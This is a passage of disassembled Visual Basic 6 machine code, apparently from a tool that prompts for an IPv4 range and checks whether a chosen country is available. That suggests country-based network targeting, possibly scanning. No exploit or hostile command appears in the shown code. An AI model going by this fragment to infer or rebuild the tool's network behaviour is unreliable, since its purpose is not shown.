007F19DF: movsd 
007F19E0: movsd 
007F19E1: push 00000001h
007F19E3: push 00000010h
007F19E5: push 00440E58h
007F19EA: push 00000010h
007F19EC: pop eax
007F19ED: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F19F2: lea esi, var_00000158
007F19F8: mov edi, esp
007F19FA: movsd 
007F19FB: movsd 
007F19FC: movsd 
007F19FD: movsd 
007F19FE: push 00000001h
007F1A00: push 00000000h
007F1A02: push 00440E48h
007F1A07: push 00000000h
007F1A09: push 00000018h
007F1A0B: mov eax, var_00000498
007F1A11: mov eax, [eax]
007F1A13: mov ecx, var_00000498
007F1A19: mov ecx, [ecx]
007F1A1B: mov ecx, [ecx]
007F1A1D: push eax
007F1A1E: call [ecx+00000550h]
007F1A24: push eax
007F1A25: lea eax, var_70
007F1A28: push eax
007F1A29: call 00410A84h ; Set (object)
007F1A2E: push eax
007F1A2F: lea eax, var_00000094
007F1A35: push eax
007F1A36: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1A3B: add esp, 00000010h
007F1A3E: push eax
007F1A3F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1A44: push eax
007F1A45: lea eax, var_74
007F1A48: push eax
007F1A49: call 00410A84h ; Set (object)
007F1A4E: push eax
007F1A4F: lea eax, var_000000A4
007F1A55: push eax
007F1A56: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1A5B: add esp, 00000020h
007F1A5E: push eax
007F1A5F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1A64: push eax
007F1A65: lea eax, var_78
007F1A68: push eax
007F1A69: call 00410A84h ; Set (object)
007F1A6E: push eax
007F1A6F: lea eax, var_000000B4
007F1A75: push eax
007F1A76: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1A7B: add esp, 00000020h
007F1A7E: push eax
007F1A7F: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F1A84: mov var_000000BC, eax
007F1A8A: mov var_000000C4, 00000008h
007F1A94: lea eax, var_000000C4
007F1A9A: push eax
007F1A9B: lea eax, var_000000D4
007F1AA1: push eax
007F1AA2: call 00410856h ; LCase(arg_1)
007F1AA7: lea eax, var_4C
007F1AAA: mov var_00000180, eax
007F1AB0: mov var_00000188, 00004008h
007F1ABA: lea eax, var_00000188
007F1AC0: push eax
007F1AC1: lea eax, var_000000E4
007F1AC7: push eax
007F1AC8: call 00410856h ; LCase(arg_1)
007F1ACD: lea eax, var_000000D4
007F1AD3: push eax
007F1AD4: lea eax, var_000000E4
007F1ADA: push eax
007F1ADB: call 004108FEh ; msvbvm60.dll.__vbaVarTstEq
007F1AE0: mov var_000001F0, ax
007F1AE7: lea eax, var_78
007F1AEA: push eax
007F1AEB: lea eax, var_74
007F1AEE: push eax
007F1AEF: lea eax, var_70
007F1AF2: push eax
007F1AF3: push 00000003h
007F1AF5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F1AFA: add esp, 00000010h
007F1AFD: lea eax, var_000000E4
007F1B03: push eax
007F1B04: lea eax, var_000000D4
007F1B0A: push eax
007F1B0B: lea eax, var_000000C4
007F1B11: push eax
007F1B12: lea eax, var_000000B4
007F1B18: push eax
007F1B19: lea eax, var_000000A4
007F1B1F: push eax
007F1B20: lea eax, var_00000094
007F1B26: push eax
007F1B27: push 00000006h
007F1B29: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F1B2E: add esp, 0000001Ch
007F1B31: movsx eax, word ptr var_000001F0
007F1B38: test eax, eax
007F1B3A: jz 7F1B48h
007F1B3C: mov var_04, 00000046h
007F1B43: or word ptr var_38, FFFFh
007F1B48: mov var_04, 00000048h
007F1B4F: lea eax, var_000002A0
007F1B55: push eax
007F1B56: lea eax, var_00000290
007F1B5C: push eax
007F1B5D: lea eax, var_30
007F1B60: push eax
007F1B61: call 00410A36h ; Next
007F1B66: mov var_000003C8, eax
007F1B6C: cmp var_000003C8, 00000000h
007F1B73: jnz 007F1971h
007F1B79: mov var_04, 00000049h
007F1B80: mov edx, var_4C
007F1B83: mov ecx, 008F2490h
007F1B88: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
007F1B8D: mov var_04, 0000004Ah
007F1B94: cmp word ptr var_38, FFFFh
007F1B99: jnz 007F22B7h
007F1B9F: mov var_04, 0000004Bh
007F1BA6: mov var_00000150, 00000001h
007F1BB0: mov var_00000158, 00000002h
007F1BBA: cmp [008F2010h], 00000000h
007F1BC1: jnz 7F1BDEh
007F1BC3: push 008F2010h
007F1BC8: push 00433984h
007F1BCD: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F1BD2: mov var_0000049C, 008F2010h
007F1BDC: jmp 7F1BE8h
007F1BDE: mov var_0000049C, 008F2010h
007F1BE8: push 00000000h
007F1BEA: push 00000001h
007F1BEC: push 00440E48h
007F1BF1: push 00000000h
007F1BF3: push 00000018h
007F1BF5: mov eax, var_0000049C
007F1BFB: mov eax, [eax]
007F1BFD: mov ecx, var_0000049C
007F1C03: mov ecx, [ecx]
007F1C05: mov ecx, [ecx]
007F1C07: push eax
007F1C08: call [ecx+00000550h]
007F1C0E: push eax
007F1C0F: lea eax, var_70
007F1C12: push eax
007F1C13: call 00410A84h ; Set (object)
007F1C18: push eax
007F1C19: lea eax, var_00000094
007F1C1F: push eax
007F1C20: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1C25: add esp, 00000010h
007F1C28: push eax
007F1C29: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1C2E: push eax
007F1C2F: lea eax, var_74
007F1C32: push eax
007F1C33: call 00410A84h ; Set (object)
007F1C38: push eax
007F1C39: lea eax, var_000000A4
007F1C3F: push eax
007F1C40: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1C45: add esp, 00000010h
007F1C48: push eax
007F1C49: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F1C4E: mov var_00000160, eax
007F1C54: mov var_00000168, 00000003h
007F1C5E: mov var_00000170, 00000001h
007F1C68: mov var_00000178, 00000002h
007F1C72: lea eax, var_00000158
007F1C78: push eax
007F1C79: lea eax, var_00000168
007F1C7F: push eax
007F1C80: lea eax, var_00000178
007F1C86: push eax
007F1C87: lea eax, var_000002C0
007F1C8D: push eax
007F1C8E: lea eax, var_000002B0
007F1C94: push eax
007F1C95: lea eax, var_30
007F1C98: push eax
007F1C99: call 00410A3Ch ; For
007F1C9E: mov var_000003CC, eax
007F1CA4: lea eax, var_74
007F1CA7: push eax
007F1CA8: lea eax, var_70
007F1CAB: push eax
007F1CAC: push 00000002h
007F1CAE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F1CB3: add esp, 0000000Ch
007F1CB6: lea eax, var_000000A4
007F1CBC: push eax
007F1CBD: lea eax, var_00000094
007F1CC3: push eax
007F1CC4: push 00000002h
007F1CC6: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F1CCB: add esp, 0000000Ch
007F1CCE: jmp 007F22A5h
007F1CD3: mov var_04, 0000004Ch
007F1CDA: mov var_00000160, 0000000Eh
007F1CE4: mov var_00000168, 00000003h
007F1CEE: lea eax, var_30
007F1CF1: mov var_00000150, eax
007F1CF7: mov var_00000158, 0000400Ch
007F1D01: cmp [008F2010h], 00000000h
007F1D08: jnz 7F1D25h
007F1D0A: push 008F2010h
007F1D0F: push 00433984h
007F1D14: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F1D19: mov var_000004A0, 008F2010h
007F1D23: jmp 7F1D2Fh
007F1D25: mov var_000004A0, 008F2010h
007F1D2F: push 00000010h
007F1D31: pop eax
007F1D32: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F1D37: lea esi, var_00000168
007F1D3D: mov edi, esp
007F1D3F: movsd 
007F1D40: movsd 
007F1D41: movsd 
007F1D42: movsd 
007F1D43: push 00000001h
007F1D45: push 00000010h
007F1D47: push 00440E58h
007F1D4C: push 00000010h
007F1D4E: pop eax
007F1D4F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F1D54: lea esi, var_00000158
007F1D5A: mov edi, esp
007F1D5C: movsd 
007F1D5D: movsd 
007F1D5E: movsd 
007F1D5F: movsd 
007F1D60: push 00000001h
007F1D62: push 00000000h
007F1D64: push 00440E48h
007F1D69: push 00000000h
007F1D6B: push 00000018h
007F1D6D: mov eax, var_000004A0
007F1D73: mov eax, [eax]
007F1D75: mov ecx, var_000004A0
007F1D7B: mov ecx, [ecx]
007F1D7D: mov ecx, [ecx]
007F1D7F: push eax
007F1D80: call [ecx+00000550h]
007F1D86: push eax
007F1D87: lea eax, var_70
007F1D8A: push eax
007F1D8B: call 00410A84h ; Set (object)
007F1D90: push eax
007F1D91: lea eax, var_00000094
007F1D97: push eax
007F1D98: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1D9D: add esp, 00000010h
007F1DA0: push eax
007F1DA1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1DA6: push eax
007F1DA7: lea eax, var_74
007F1DAA: push eax
007F1DAB: call 00410A84h ; Set (object)
007F1DB0: push eax
007F1DB1: lea eax, var_000000A4
007F1DB7: push eax
007F1DB8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1DBD: add esp, 00000020h
007F1DC0: push eax
007F1DC1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1DC6: push eax
007F1DC7: lea eax, var_78
007F1DCA: push eax
007F1DCB: call 00410A84h ; Set (object)
007F1DD0: push eax
007F1DD1: lea eax, var_000000B4
007F1DD7: push eax
007F1DD8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1DDD: add esp, 00000020h
007F1DE0: push eax
007F1DE1: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F1DE6: mov var_000000BC, eax
007F1DEC: mov var_000000C4, 00000008h
007F1DF6: lea eax, var_000000C4
007F1DFC: push eax
007F1DFD: lea eax, var_000000D4
007F1E03: push eax
007F1E04: call 00410856h ; LCase(arg_1)
007F1E09: lea eax, var_4C
007F1E0C: mov var_00000180, eax
007F1E12: mov var_00000188, 00004008h
007F1E1C: lea eax, var_00000188
007F1E22: push eax
007F1E23: lea eax, var_000000E4
007F1E29: push eax
007F1E2A: call 00410856h ; LCase(arg_1)
007F1E2F: lea eax, var_000000D4
007F1E35: push eax
007F1E36: lea eax, var_000000E4
007F1E3C: push eax
007F1E3D: call 004108FEh ; msvbvm60.dll.__vbaVarTstEq
007F1E42: mov var_000001F0, ax
007F1E49: lea eax, var_78
007F1E4C: push eax
007F1E4D: lea eax, var_74
007F1E50: push eax
007F1E51: lea eax, var_70
007F1E54: push eax
007F1E55: push 00000003h
007F1E57: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F1E5C: add esp, 00000010h
007F1E5F: lea eax, var_000000E4
007F1E65: push eax
007F1E66: lea eax, var_000000D4
007F1E6C: push eax
007F1E6D: lea eax, var_000000C4
007F1E73: push eax
007F1E74: lea eax, var_000000B4
007F1E7A: push eax
007F1E7B: lea eax, var_000000A4
007F1E81: push eax
007F1E82: lea eax, var_00000094
007F1E88: push eax
007F1E89: push 00000006h
007F1E8B: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F1E90: add esp, 0000001Ch
007F1E93: movsx eax, word ptr var_000001F0
007F1E9A: test eax, eax
007F1E9C: jz 007F21DEh
007F1EA2: mov var_04, 0000004Dh
007F1EA9: lea eax, var_30
007F1EAC: mov var_00000150, eax
007F1EB2: mov var_00000158, 0000400Ch
007F1EBC: cmp [008F2010h], 00000000h
007F1EC3: jnz 7F1EE0h
007F1EC5: push 008F2010h
007F1ECA: push 00433984h
007F1ECF: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F1ED4: mov var_000004A4, 008F2010h
007F1EDE: jmp 7F1EEAh
007F1EE0: mov var_000004A4, 008F2010h
007F1EEA: push 00000000h
007F1EEC: push 00000014h
007F1EEE: push 00440E58h
007F1EF3: push 00000010h
007F1EF5: pop eax
007F1EF6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F1EFB: lea esi, var_00000158
007F1F01: mov edi, esp
007F1F03: movsd 
007F1F04: movsd 
007F1F05: movsd 
007F1F06: movsd 
007F1F07: push 00000001h
007F1F09: push 00000000h
007F1F0B: push 00440E48h
007F1F10: push 00000000h
007F1F12: push 00000018h
007F1F14: mov eax, var_000004A4
007F1F1A: mov eax, [eax]
007F1F1C: mov ecx, var_000004A4
007F1F22: mov ecx, [ecx]
007F1F24: mov ecx, [ecx]
007F1F26: push eax
007F1F27: call [ecx+00000550h]
007F1F2D: push eax
007F1F2E: lea eax, var_70
007F1F31: push eax
007F1F32: call 00410A84h ; Set (object)
007F1F37: push eax
007F1F38: lea eax, var_00000094
007F1F3E: push eax
007F1F3F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1F44: add esp, 00000010h
007F1F47: push eax
007F1F48: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1F4D: push eax
007F1F4E: lea eax, var_74
007F1F51: push eax
007F1F52: call 00410A84h ; Set (object)
007F1F57: push eax
007F1F58: lea eax, var_000000A4
007F1F5E: push eax
007F1F5F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1F64: add esp, 00000020h
007F1F67: push eax
007F1F68: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F1F6D: push eax
007F1F6E: lea eax, var_78
007F1F71: push eax
007F1F72: call 00410A84h ; Set (object)
007F1F77: push eax
007F1F78: lea eax, var_000000B4
007F1F7E: push eax
007F1F7F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F1F84: add esp, 00000010h
007F1F87: lea eax, var_30
007F1F8A: mov var_00000160, eax
007F1F90: mov var_00000168, 0000400Ch
007F1F9A: cmp [008F2010h], 00000000h
007F1FA1: jnz 7F1FBEh
007F1FA3: push 008F2010h
007F1FA8: push 00433984h
007F1FAD: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F1FB2: mov var_000004A8, 008F2010h
007F1FBC: jmp 7F1FC8h
007F1FBE: mov var_000004A8, 008F2010h
007F1FC8: push 00000000h
007F1FCA: push 00000014h
007F1FCC: push 00440E58h
007F1FD1: push 00000010h
007F1FD3: pop eax
007F1FD4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F1FD9: lea esi, var_00000168
007F1FDF: mov edi, esp
007F1FE1: movsd 
007F1FE2: movsd 
007F1FE3: movsd 
007F1FE4: movsd 
007F1FE5: push 00000001h
007F1FE7: push 00000000h
007F1FE9: push 00440E48h
007F1FEE: push 00000000h
007F1FF0: push 00000018h
007F1FF2: mov eax, var_000004A8
007F1FF8: mov eax, [eax]
007F1FFA: mov ecx, var_000004A8
007F2000: mov ecx, [ecx]
007F2002: mov ecx, [ecx]
007F2004: push eax
007F2005: call [ecx+00000550h]
007F200B: push eax
007F200C: lea eax, var_7C
007F200F: push eax
007F2010: call 00410A84h ; Set (object)
007F2015: push eax
007F2016: lea eax, var_000000C4
007F201C: push eax
007F201D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2022: add esp, 00000010h
007F2025: push eax
007F2026: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F202B: push eax
007F202C: lea eax, var_80
007F202F: push eax
007F2030: call 00410A84h ; Set (object)
007F2035: push eax
007F2036: lea eax, var_000000D4
007F203C: push eax
007F203D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2042: add esp, 00000020h
007F2045: push eax
007F2046: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F204B: push eax
007F204C: lea eax, var_00000084
007F2052: push eax
007F2053: call 00410A84h ; Set (object)
007F2058: push eax
007F2059: lea eax, var_000000E4
007F205F: push eax
007F2060: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2065: add esp, 00000010h
007F2068: cmp [008F2410h], 00000000h
007F206F: jnz 7F208Ch
007F2071: push 008F2410h
007F2076: push 00440E38h
007F207B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F2080: mov var_000004AC, 008F2410h
007F208A: jmp 7F2096h
007F208C: mov var_000004AC, 008F2410h
007F2096: mov eax, var_000004AC
007F209C: mov eax, [eax]
007F209E: mov var_000001F0, eax
007F20A4: mov var_0000011C, 80020004h
007F20AE: mov var_00000124, 0000000Ah
007F20B8: mov var_0000010C, 80020004h
007F20C2: mov var_00000114, 0000000Ah
007F20CC: lea eax, var_000000E4
007F20D2: push eax
007F20D3: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F20D8: mov var_000000FC, eax
007F20DE: mov var_00000104, 00000008h
007F20E8: lea eax, var_000000B4
007F20EE: push eax
007F20EF: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
007F20F4: mov var_000000EC, eax
007F20FA: mov var_000000F4, 00000008h
007F2104: lea eax, var_00000124
007F210A: push eax
007F210B: lea eax, var_00000114
007F2111: push eax
007F2112: lea eax, var_00000104
007F2118: push eax
007F2119: lea eax, var_000000F4
007F211F: push eax
007F2120: mov eax, var_000001F0
007F2126: mov eax, [eax]
007F2128: push var_000001F0
007F212E: call [eax+20h]
007F2131: fclex 
007F2133: mov var_000001F4, eax
007F2139: cmp var_000001F4, 00000000h
007F2140: jnl 7F2162h
007F2142: push 00000020h
007F2144: push 00440E28h
007F2149: push var_000001F0
007F214F: push var_000001F4
007F2155: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F215A: mov var_000004B0, eax
007F2160: jmp 7F2169h
007F2162: and var_000004B0, 00000000h
007F2169: lea eax, var_00000084
007F216F: push eax
007F2170: lea eax, var_80
007F2173: push eax
007F2174: lea eax, var_7C
007F2177: push eax
007F2178: lea eax, var_78
007F217B: push eax
007F217C: lea eax, var_74
007F217F: push eax
007F2180: lea eax, var_70
007F2183: push eax
007F2184: push 00000006h
007F2186: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F218B: add esp, 0000001Ch
007F218E: lea eax, var_00000124
007F2194: push eax
007F2195: lea eax, var_00000114
007F219B: push eax
007F219C: lea eax, var_00000104
007F21A2: push eax
007F21A3: lea eax, var_000000F4
007F21A9: push eax
007F21AA: lea eax, var_000000E4
007F21B0: push eax
007F21B1: lea eax, var_000000D4
007F21B7: push eax
007F21B8: lea eax, var_000000C4
007F21BE: push eax
007F21BF: lea eax, var_000000B4
007F21C5: push eax
007F21C6: lea eax, var_000000A4
007F21CC: push eax
007F21CD: lea eax, var_00000094
007F21D3: push eax
007F21D4: push 0000000Ah
007F21D6: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F21DB: add esp, 0000002Ch
007F21DE: mov var_04, 0000004Fh
007F21E5: cmp [008F2410h], 00000000h
007F21EC: jnz 7F2209h
007F21EE: push 008F2410h
007F21F3: push 00440E38h
007F21F8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F21FD: mov var_000004B4, 008F2410h
007F2207: jmp 7F2213h
007F2209: mov var_000004B4, 008F2410h
007F2213: mov eax, var_000004B4
007F2219: mov eax, [eax]
007F221B: mov var_000001F0, eax
007F2221: lea eax, var_000001DC
007F2227: push eax
007F2228: mov eax, var_000001F0
007F222E: mov eax, [eax]
007F2230: push var_000001F0
007F2236: call [eax+24h]
007F2239: fclex 
007F223B: mov var_000001F4, eax
007F2241: cmp var_000001F4, 00000000h
007F2248: jnl 7F226Ah
007F224A: push 00000024h
007F224C: push 00440E28h
007F2251: push var_000001F0
007F2257: push var_000001F4
007F225D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F2262: mov var_000004B8, eax
007F2268: jmp 7F2271h
007F226A: and var_000004B8, 00000000h
007F2271: mov eax, var_000001DC
007F2277: cmp eax, [008F2480h]
007F227D: jle 7F2281h
007F227F: jmp 7F22B2h
007F2281: mov var_04, 00000052h
007F2288: lea eax, var_000002C0
007F228E: push eax
007F228F: lea eax, var_000002B0
007F2295: push eax
007F2296: lea eax, var_30
007F2299: push eax
007F229A: call 00410A36h ; Next
007F229F: mov var_000003CC, eax
007F22A5: cmp var_000003CC, 00000000h
007F22AC: jnz 007F1CD3h
007F22B2: jmp 007F236Dh
007F22B7: mov var_04, 00000054h
007F22BE: mov var_000000BC, 80020004h
007F22C8: mov var_000000C4, 0000000Ah
007F22D2: mov var_000000AC, 80020004h
007F22DC: mov var_000000B4, 0000000Ah
007F22E6: mov var_0000009C, 80020004h
007F22F0: mov var_000000A4, 0000000Ah
007F22FA: mov var_00000150, 00450914h ; The specified country is not available at the moment
007F2304: mov var_00000158, 00000008h
007F230E: lea edx, var_00000158
007F2314: lea ecx, var_00000094
007F231A: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F231F: lea eax, var_000000C4
007F2325: push eax
007F2326: lea eax, var_000000B4
007F232C: push eax
007F232D: lea eax, var_000000A4
007F2333: push eax
007F2334: push 00000010h
007F2336: lea eax, var_00000094
007F233C: push eax
007F233D: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
007F2342: lea eax, var_000000C4
007F2348: push eax
007F2349: lea eax, var_000000B4
007F234F: push eax
007F2350: lea eax, var_000000A4
007F2356: push eax
007F2357: lea eax, var_00000094
007F235D: push eax
007F235E: push 00000004h
007F2360: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F2365: add esp, 00000014h
007F2368: jmp 007F712Eh
007F236D: jmp 007F3E47h
007F2372: mov var_04, 00000057h
007F2379: mov eax, [ebp+08h]
007F237C: mov eax, [eax]
007F237E: push [ebp+08h]
007F2381: call [eax+00000364h]
007F2387: push eax
007F2388: lea eax, var_70
007F238B: push eax
007F238C: call 00410A84h ; Set (object)
007F2391: mov var_000001F0, eax
007F2397: lea eax, var_74
007F239A: push eax
007F239B: push 00000002h
007F239D: mov eax, var_000001F0
007F23A3: mov eax, [eax]
007F23A5: push var_000001F0
007F23AB: call [eax+40h]
007F23AE: fclex 
007F23B0: mov var_000001F4, eax
007F23B6: cmp var_000001F4, 00000000h
007F23BD: jnl 7F23DFh
007F23BF: push 00000040h
007F23C1: push 00440DE8h
007F23C6: push var_000001F0
007F23CC: push var_000001F4
007F23D2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007F23D7: mov var_000004BC, eax
007F23DD: jmp 7F23E6h
007F23DF: and var_000004BC, 00000000h
007F23E6: push 00000000h
007F23E8: push 00000000h
007F23EA: push var_74
007F23ED: lea eax, var_00000094
007F23F3: push eax
007F23F4: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F23F9: add esp, 00000010h
007F23FC: push eax
007F23FD: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
007F2402: sub ax, FFFFh
007F2406: neg ax
007F2409: sbb eax, eax
007F240B: inc eax
007F240C: neg eax
007F240E: mov var_000001F8, ax
007F2415: lea eax, var_74
007F2418: push eax
007F2419: lea eax, var_70
007F241C: push eax
007F241D: push 00000002h
007F241F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F2424: add esp, 0000000Ch
007F2427: lea ecx, var_00000094
007F242D: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
007F2432: movsx eax, word ptr var_000001F8
007F2439: test eax, eax
007F243B: jz 007F3136h
007F2441: mov var_04, 00000058h
007F2448: mov [008F2484h], 00000002h
007F2452: mov var_04, 00000059h
007F2459: mov var_000000EC, 80020004h
007F2463: mov var_000000F4, 0000000Ah
007F246D: mov var_000000DC, 80020004h
007F2477: mov var_000000E4, 0000000Ah
007F2481: mov var_000000CC, 80020004h
007F248B: mov var_000000D4, 0000000Ah
007F2495: mov var_000000BC, 80020004h
007F249F: mov var_000000C4, 0000000Ah
007F24A9: mov var_000000AC, 80020004h
007F24B3: mov var_000000B4, 0000000Ah
007F24BD: mov var_0000009C, 80020004h
007F24C7: mov var_000000A4, 0000000Ah
007F24D1: mov var_00000150, 00450984h ; IPv4 Range (eg. 111.222.333 or 111.222 or just 111)
007F24DB: mov var_00000158, 00000008h
007F24E5: lea edx, var_00000158
007F24EB: lea ecx, var_00000094
007F24F1: call 004109E2h ; msvbvm60.dll.__vbaVarDup
007F24F6: lea eax, var_000000F4
007F24FC: push eax
007F24FD: lea eax, var_000000E4
007F2503: push eax
007F2504: lea eax, var_000000D4
007F250A: push eax
007F250B: lea eax, var_000000C4
007F2511: push eax
007F2512: lea eax, var_000000B4
007F2518: push eax
007F2519: lea eax, var_000000A4
007F251F: push eax
007F2520: lea eax, var_00000094
007F2526: push eax
007F2527: call 00410994h ; InputBox
007F252C: mov edx, eax
007F252E: lea ecx, var_40
007F2531: call 00410A24h ; msvbvm60.dll.__vbaStrMove
007F2536: lea eax, var_000000F4
007F253C: push eax
007F253D: lea eax, var_000000E4
007F2543: push eax
007F2544: lea eax, var_000000D4
007F254A: push eax
007F254B: lea eax, var_000000C4
007F2551: push eax
007F2552: lea eax, var_000000B4
007F2558: push eax
007F2559: lea eax, var_000000A4
007F255F: push eax
007F2560: lea eax, var_00000094
007F2566: push eax
007F2567: push 00000007h
007F2569: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F256E: add esp, 00000020h
007F2571: mov var_04, 0000005Ah
007F2578: mov var_00000150, 00000001h
007F2582: mov var_00000158, 00000002h
007F258C: cmp [008F2010h], 00000000h
007F2593: jnz 7F25B0h
007F2595: push 008F2010h
007F259A: push 00433984h
007F259F: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F25A4: mov var_000004C0, 008F2010h
007F25AE: jmp 7F25BAh
007F25B0: mov var_000004C0, 008F2010h
007F25BA: push 00000000h
007F25BC: push 00000001h
007F25BE: push 00440E48h
007F25C3: push 00000000h
007F25C5: push 00000018h
007F25C7: mov eax, var_000004C0
007F25CD: mov eax, [eax]
007F25CF: mov ecx, var_000004C0
007F25D5: mov ecx, [ecx]
007F25D7: mov ecx, [ecx]
007F25D9: push eax
007F25DA: call [ecx+00000550h]
007F25E0: push eax
007F25E1: lea eax, var_70
007F25E4: push eax
007F25E5: call 00410A84h ; Set (object)
007F25EA: push eax
007F25EB: lea eax, var_00000094
007F25F1: push eax
007F25F2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F25F7: add esp, 00000010h
007F25FA: push eax
007F25FB: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F2600: push eax
007F2601: lea eax, var_74
007F2604: push eax
007F2605: call 00410A84h ; Set (object)
007F260A: push eax
007F260B: lea eax, var_000000A4
007F2611: push eax
007F2612: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F2617: add esp, 00000010h
007F261A: push eax
007F261B: call 00410A90h ; msvbvm60.dll.__vbaI4Var
007F2620: mov var_00000160, eax
007F2626: mov var_00000168, 00000003h
007F2630: mov var_00000170, 00000001h
007F263A: mov var_00000178, 00000002h
007F2644: lea eax, var_00000158
007F264A: push eax
007F264B: lea eax, var_00000168
007F2651: push eax
007F2652: lea eax, var_00000178
007F2658: push eax
007F2659: lea eax, var_000002E0
007F265F: push eax
007F2660: lea eax, var_000002D0
007F2666: push eax
007F2667: lea eax, var_30
007F266A: push eax
007F266B: call 00410A3Ch ; For
007F2670: mov var_000003D0, eax
007F2676: lea eax, var_74
007F2679: push eax
007F267A: lea eax, var_70
007F267D: push eax
007F267E: push 00000002h
007F2680: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
007F2685: add esp, 0000000Ch
007F2688: lea eax, var_000000A4
007F268E: push eax
007F268F: lea eax, var_00000094
007F2695: push eax
007F2696: push 00000002h
007F2698: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
007F269D: add esp, 0000000Ch
007F26A0: jmp 007F28E8h
007F26A5: mov var_04, 0000005Bh
007F26AC: mov var_00000160, 00000001h
007F26B6: mov var_00000168, 00000003h
007F26C0: lea eax, var_30
007F26C3: mov var_00000150, eax
007F26C9: mov var_00000158, 0000400Ch
007F26D3: cmp [008F2010h], 00000000h
007F26DA: jnz 7F26F7h
007F26DC: push 008F2010h
007F26E1: push 00433984h
007F26E6: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
007F26EB: mov var_000004C4, 008F2010h
007F26F5: jmp 7F2701h
007F26F7: mov var_000004C4, 008F2010h
007F2701: push 00000010h
007F2703: pop eax
007F2704: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F2709: lea esi, var_00000168
007F270F: mov edi, esp
007F2711: movsd 
007F2712: movsd 
007F2713: movsd 
007F2714: movsd 
007F2715: push 00000001h
007F2717: push 00000010h
007F2719: push 00440E58h
007F271E: push 00000010h
007F2720: pop eax
007F2721: call 004106A0h ; msvbvm60.dll.__vbaChkstk
007F2726: lea esi, var_00000158
007F272C: mov edi, esp
007F272E: movsd 
007F272F: movsd 
007F2730: movsd 
007F2731: movsd 
007F2732: push 00000001h
007F2734: push 00000000h
007F2736: push 00440E48h
007F273B: push 00000000h
007F273D: push 00000018h
007F273F: mov eax, var_000004C4
007F2745: mov eax, [eax]
007F2747: mov ecx, var_000004C4
007F274D: mov ecx, [ecx]
007F274F: mov ecx, [ecx]
007F2751: push eax
007F2752: call [ecx+00000550h]
007F2758: push eax
007F2759: lea eax, var_70
007F275C: push eax
007F275D: call 00410A84h ; Set (object)
007F2762: push eax
007F2763: lea eax, var_00000094
007F2769: push eax
007F276A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
007F276F: add esp, 00000010h
007F2772: push eax
007F2773: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
007F2778: push eax
007F2779: lea eax, var_74
007F277C: push eax
007F277D: call 00410A84h ; Set (object)
007F2782: push eax
007F2783: lea eax, var_000000A4
007F2789: push eax
